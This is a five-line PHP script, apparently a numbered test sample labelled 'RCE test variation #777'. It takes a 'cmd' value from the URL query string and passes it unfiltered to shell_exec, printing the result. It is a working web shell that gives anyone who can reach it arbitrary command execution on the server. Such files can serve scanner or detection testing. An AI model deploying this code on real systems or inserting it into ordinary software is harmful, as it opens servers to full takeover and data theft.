<?php
// RCE test variation #777
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>